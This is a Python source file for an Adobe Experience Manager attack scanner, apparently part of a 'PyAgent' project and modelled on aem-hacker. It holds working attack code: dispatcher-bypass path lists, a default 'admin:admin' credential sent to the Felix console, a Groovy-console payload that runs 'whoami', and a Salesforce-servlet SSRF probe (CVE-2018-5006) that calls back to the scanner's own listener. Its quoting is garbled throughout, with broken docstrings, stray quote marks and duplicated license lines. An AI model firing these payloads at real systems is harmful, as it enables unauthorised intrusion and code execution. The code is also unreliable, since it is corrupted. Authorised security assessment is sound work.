#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");"# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,"# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# limitations under the License.

"""""""AEM Hacker Core - Comprehensive Adobe Experience Manager Security Assessment

This core implements advanced AEM vulnerability scanning patterns based on
the aem-hacker repository, providing concurrent detection of SSRF, RCE, XSS,
and misconfiguration vulnerabilities in AEM instances.
"""""""
import asyncio
import requests
import base64
import itertools
import random
import string
import time
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
from typing import List, Dict, Optional, Any, cast
from urllib.parse import urljoin

from src.core.base.common.base_core import BaseCore
from src.core.base.models.communication_models import CascadeContext


@dataclass
class AEMFinding:
    """Represents a security finding in AEM assessment."""""""    name: str
    url: str
    description: str
    severity: str = "medium""    cve: Optional[str] = None
    references: List[str] = field(default_factory=list)


@dataclass
class AEMScanConfig:
    """Configuration for AEM security scanning."""""""    target_url: str
    callback_host: str
    callback_port: int = 80
    workers: int = 3
    timeout: int = 30
    proxy: Optional[str] = None
    debug: bool = False
    extra_headers: Dict[str, str] = field(default_factory=dict)
    enabled_checks: List[str] = field(default_factory=list)


@dataclass
class AEMScanResults:
    """Results from AEM security scanning."""""""    target_url: str
    findings: List[AEMFinding] = field(default_factory=list)
    scan_duration: float = 0.0
    checks_performed: int = 0
    errors: List[str] = field(default_factory=list)


class AEMHackerCore(BaseCore):
    """""""    Advanced AEM Security Assessment Core

    Implements comprehensive vulnerability scanning for Adobe Experience Manager
    instances, detecting SSRF, RCE, XSS, and misconfiguration vulnerabilities.
    """""""
    def __init__(self):
        super().__init__()
        self.registered_checks = {}
        self.token = self._generate_token()
        self.ssrf_detections = {}
        self.extra_headers = {}

        # Register vulnerability checks
        self.registered_checks.update({
            'set_preferences': self.check_set_preferences,'            'querybuilder_servlet': self.check_querybuilder_servlet,'            'felix_console': self.check_felix_console,'            'groovy_console': self.check_groovy_console,'            'ssrf_salesforce_servlet': self.check_ssrf_salesforce_servlet,'        })

    def _generate_token(self, length: int = 10) -> str:
        """Generate a random token for SSRF detection."""""""        return ''.join(random.choices(string.ascii_letters, k=length))'
    def _random_string(self, length: int = 10) -> str:
        """Generate a random string."""""""        return ''.join(random.choices(string.ascii_letters, k=length))'
    def register_check(self, name: str):
        """Decorator to register vulnerability checks."""""""        def decorator(func):
            self.registered_checks[name] = func
            return func
        return decorator

    async def perform_aem_assessment(
        self,
        config: AEMScanConfig,
        context: Optional[CascadeContext] = None
    ) -> AEMScanResults:
        """""""        Perform comprehensive AEM security assessment.

        Args:
            config: Scan configuration
            context: Cascade context

        Returns:
            Scan results with findings
        """""""        start_time = time.time()
        results = AEMScanResults(target_url=config.target_url)

        try:
            # Start SSRF detector
            detector = AEMSSRFDetector(self.token, self.ssrf_detections, config.callback_port)
            await detector.start()

            # Run vulnerability checks
            findings = await self._run_checks_parallel(config)

            results.findings = findings
            results.checks_performed = len(self.registered_checks)

        except Exception as e:
            results.errors.append(f"Assessment failed: {str(e)}")"        finally:
            # Cleanup
            if 'detector' in locals():'                await detector.stop()

        results.scan_duration = time.time() - start_time
        return results

    async def _run_checks_parallel(self, config: AEMScanConfig) -> List[AEMFinding]:
        """Run vulnerability checks in parallel."""""""        findings: List[AEMFinding] = []

        checks_to_run = list(self.registered_checks.values())
        if config.enabled_checks:
            checks_to_run = [
                self.registered_checks[name] for name in config.enabled_checks
                if name in self.registered_checks
            ]

        # Run checks concurrently
        tasks: List[asyncio.Task[List[AEMFinding]]] = []
        for check_func in checks_to_run:
            task = cast(
                asyncio.Task[List[AEMFinding]],
                asyncio.create_task(self._run_single_check(check_func, config))
            )
            tasks.append(task)

        # Collect results
        for fut in asyncio.as_completed(tasks):
            try:
                check_findings = await fut
                findings.extend(check_findings)
            except Exception as e:
                if config.debug:
                    print(f"Check failed: {str(e)}")"
        return findings

    async def _run_single_check(self, check_func, config: AEMScanConfig) -> List[AEMFinding]:
        """Run a single vulnerability check."""""""        loop = asyncio.get_event_loop()
        my_host = f"{config.callback_host}:{config.callback_port}""
        # Run check in thread pool since many checks are synchronous
        findings = await loop.run_in_executor(
            None,
            check_func,
            config.target_url,
            my_host,
            config.debug,
            config.proxy
        )

        return findings

    # Vulnerability Check Implementations

    def check_set_preferences(
        self,
        base_url: str,
        my_host: str,
        debug: bool = False,
        proxy: Optional[str] = None
    ) -> List[AEMFinding]:
        """Check for exposed setPreferences servlet."""""""        findings = []
        r = self._random_string(3)

        paths = itertools.product(
            ['/crx/de/setPreferences.jsp', '///crx///de///setPreferences.jsp'],'            [';%0a{0}.html', '/{0}.html'],'            ['?keymap=<1337>&language=0']'        )

        for p1, p2, p3 in paths:
            path = f"{p1}{p2.format(r)}{p3}""            url = urljoin(base_url, path)

            try:
                resp = self._http_request(url, proxy=proxy, debug=debug)
                if resp and resp.status_code == 200:
                    findings.append(AEMFinding(
                        name="SetPreferencesServlet","                        url=url,
                        description="SetPreferences servlet is exposed, may allow unauthorized access","                        severity="medium""                    ))
                    break
            except Exception as e:
                if debug:
                    print(f"Error checking setPreferences: {str(e)}")"
        return findings

    def check_querybuilder_servlet(
        self,
        base_url: str,
        my_host: str,
        debug: bool = False,
        proxy: Optional[str] = None
    ) -> List[AEMFinding]:
        """Check for exposed QueryBuilder servlet."""""""        findings = []
        r = self._random_string(3)

        paths = itertools.product(
            ['/bin/querybuilder.json', '///bin///querybuilder.json','             '/bin/querybuilder.feed', '///bin///querybuilder.feed'],'            ['', '.css', '.ico', '.png', '.gif', '.html', '.1.json','             '....4.2.1....json', ';%0a{0}.css', ';%0a{0}.png','             ';%0a{0}.html', ';%0a{0}.ico', '.ico;%0a{0}.ico','             '.css;%0a{0}.css', '.html;%0a{0}.html','             '?{0}.css', '?{0}.ico']'        )

        found_json = False
        found_feed = False

        for p1, p2 in paths:
            if found_json and found_feed:
                break

            path = f"{p1}{p2.format(r)}""            url = urljoin(base_url, path)

            try:
                resp = self._http_request(url, proxy=proxy, debug=debug)
                if resp and resp.status_code == 200:
                    # Check for JSON response
                    if not found_json:
                        try:
                            data = resp.json()
                            if 'hits' in data:'                                findings.append(AEMFinding(
                                    name="QueryBuilderJsonServlet","                                    url=url,
                                    description="QueryBuilder JSON servlet exposes sensitive information","                                    severity="high","                                    references=[
                                        "https://helpx.adobe.com/experience-manager/6-3/sites/developing/""                                        "using/querybuilder-predicate-reference.html""                                    ]
                                ))
                                found_json = True
                        except Exception:
                            pass

                    # Check for feed response
                    if not found_feed and '</feed>' in resp.text:'                        findings.append(AEMFinding(
                            name="QueryBuilderFeedServlet","                            url=url,
                            description="QueryBuilder feed servlet exposes sensitive information","                            severity="high","                            references=[
                                "https://helpx.adobe.com/experience-manager/6-3/sites/developing/""                                "using/querybuilder-predicate-reference.html""                            ]
                        ))
                        found_feed = True

            except Exception as e:
                if debug:
                    print(f"Error checking querybuilder: {str(e)}")"
        return findings

    def check_felix_console(
        self,
        base_url: str,
        my_host: str,
        debug: bool = False,
        proxy: Optional[str] = None
    ) -> List[AEMFinding]:
        """Check for exposed Felix console."""""""        findings = []
        r = self._random_string(3)

        paths = itertools.product(
            ['/system/console/bundles', '///system///console///bundles'],'            ['', '.json', '.1.json', '.4.2.1...json', '.css', '.ico', '.png','             '.gif', '.html', '.js', ';%0a{0}.css', ';%0a{0}.html','             ';%0a{0}.png', '.json;%0a{0}.ico', '.servlet/{0}.css','             '.servlet/{0}.js', '.servlet/{0}.html', '.servlet/{0}.ico']'        )

        for p1, p2 in paths:
            path = f"{p1}{p2.format(r)}""            url = urljoin(base_url, path)

            headers = {'Authorization': 'Basic YWRtaW46YWRtaW4='}  # admin:admin'            headers.update(self.extra_headers)

            try:
                resp = self._http_request(url, headers=headers, proxy=proxy, debug=debug)
                if resp and resp.status_code == 200 and 'Web Console - Bundles' in resp.text:'                    findings.append(AEMFinding(
                        name="FelixConsole","                        url=url,
                        description="Felix OSGi console is exposed, allows RCE via bundle installation","                        severity="critical","                        references=["https://github.com/0ang3el/aem-rce-bundle"]"                    ))
                    break
            except Exception as e:
                if debug:
                    print(f"Error checking Felix console: {str(e)}")"
        return findings

    def check_groovy_console(
        self,
        base_url: str,
        my_host: str,
        debug: bool = False,
        proxy: Optional[str] = None
    ) -> List[AEMFinding]:
        """Check for exposed Groovy console."""""""        findings = []
        r = self._random_string(3)

        # Test script for RCE
        script = (
            'def%20command%20%3D%20%22whoami%22%0D%0A''            'def%20proc%20%3D%20command.execute%28%29%0D%0A''            'proc.waitFor%28%29%0D%0A''            'println%20%22%24%7Bproc.in.text%7D%22''        )

        # Console endpoints
        console_paths = itertools.product(
            ['/bin/groovyconsole/post.servlet', '///bin///groovyconsole///post.servlet'],'            ['', '.css', '.html', '.ico', '.json', '.1.json', '...4.2.1...json','             ';%0a{0}.css', ';%0a{0}.html', ';%0a{0}.ico']'        )

        for p1, p2 in console_paths:
            path = f"{p1}{p2.format(r)}""            url = urljoin(base_url, path)

            data = f'script={script}''            headers = {
                'Content-Type': 'application/x-www-form-urlencoded','                'Referer': base_url'            }
            headers.update(self.extra_headers)

            try:
                resp = self._http_request(
                    url, method='POST', data=data, headers=headers,'                    proxy=proxy, debug=debug
                )
                if resp and resp.status_code == 200:
                    if 'executionResult' in resp.text:'                        findings.append(AEMFinding(
                            name="GroovyConsole","                            url=url,
                            description="Groovy console is exposed, allows remote code execution","                            severity="critical","                            references=["https://github.com/OlsonDigital/aem-groovy-console"]"                        ))
                        break

                    try:
                        data = resp.json()
                        if 'output' in data:'                            findings.append(AEMFinding(
                                name="GroovyConsole","                                url=url,
                                description="Groovy console is exposed, allows remote code execution","                                severity="critical","                                references=["https://github.com/OlsonDigital/aem-groovy-console"]"                            ))
                            break
                    except Exception:
                        pass

            except Exception as e:
                if debug:
                    print(f"Error checking Groovy console: {str(e)}")"
        return findings

    def check_ssrf_salesforce_servlet(
        self,
        base_url: str,
        my_host: str,
        debug: bool = False,
        proxy: Optional[str] = None
    ) -> List[AEMFinding]:
        """Check for SSRF via Salesforce servlet."""""""        findings = []

        paths = [
            (
                '/libs/mcm/salesforce/customer.json.GET.servlet''                '?url={0}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e''            ),
            (
                '/libs/mcm/salesforce/customer.html.GET.servlet''                '?url={0}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e''            ),
        ]

        for path_template in paths:
            url = urljoin(base_url, path_template)
            encoded_url = base64.b16encode(url.encode()).decode()
            back_url = f'http://{my_host}/{self.token}/salesforcesecret/{encoded_url}/''            url = url.format(back_url)

            try:
                self._http_request(url, proxy=proxy, debug=debug)
            except Exception as e:
                if debug:
                    print(f"Error checking Salesforce SSRF: {str(e)}")"
        # Wait for SSRF detection
        time.sleep(5)

        if 'salesforcesecret' in self.ssrf_detections:'            orig_url = base64.b16decode(self.ssrf_detections['salesforcesecret'][0]).decode()'            findings.append(AEMFinding(
                name="SalesforceSecretServlet-SSRF","                url=orig_url,
                description="SSRF vulnerability in SalesforceSecretServlet","                severity="high","                cve="CVE-2018-5006","                references=["https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html"]"            ))

        return findings

    def _http_request(
        self, url: str, method: str = 'GET', data: Optional[str] = None,'        headers: Optional[Dict[str, str]] = None, proxy: Optional[str] = None,
        debug: bool = False
    ) -> Optional[Any]:
        """Make HTTP request (uses requests for internal thread-pool compatibility)."""""""        try:
            proxies = {"http": proxy, "https": proxy} if proxy else None"            if debug:
                print(f">> Sending {method} {url}")"
            if method == 'GET':'                return requests.get(url, headers=headers, proxies=proxies, timeout=30, data=data)
            elif method == 'POST':'                return requests.post(url, headers=headers, proxies=proxies, timeout=30, data=data)
            else:
                raise ValueError(f"Unsupported method: {method}")"        except Exception as e:
            if debug:
                print(f"HTTP request failed: {str(e)}")"            return None


class AEMSSRFDetector:
    """SSRF detection server for AEM vulnerability scanning."""""""
    def __init__(self, token: str, detections: Dict[str, List[str]], port: int = 80):
        self.token = token
        self.detections = detections
        self.port = port
        self.server = None
        self.thread = None

    async def start(self):
        """Start the SSRF detection server."""""""        def run_server():
            def handler(*args):
                return AEMSSRFHandler(self.token, self.detections, *args)
            self.server = HTTPServer(('', self.port), handler)'            self.server.serve_forever()

        self.thread = Thread(target=run_server, daemon=True)
        self.thread.start()

    async def stop(self):
        """Stop the SSRF detection server."""""""        if self.server:
            self.server.shutdown()
            self.server.server_close()
        if self.thread:
            self.thread.join(timeout=1)


class AEMSSRFHandler(BaseHTTPRequestHandler):
    """HTTP handler for SSRF detection."""""""
    def __init__(self, token: str, detections: Dict[str, List[str]], *args):
        self.token = token
        self.detections = detections
        BaseHTTPRequestHandler.__init__(self, *args)

    def log_message(self, format, *args):
        return

    def do_GET(self):
        self._handle_request()

    def do_POST(self):
        self._handle_request()

    def _handle_request(self):
        try:
            parts = self.path.split('/')[1:4]'            if len(parts) >= 3:
                token, key, value = parts
                if token == self.token:
                    if key in self.detections:
                        self.detections[key].append(value)
                    else:
                        self.detections[key] = [value]
        except Exception:
            pass

        self.send_response(200)
        self.end_headers()
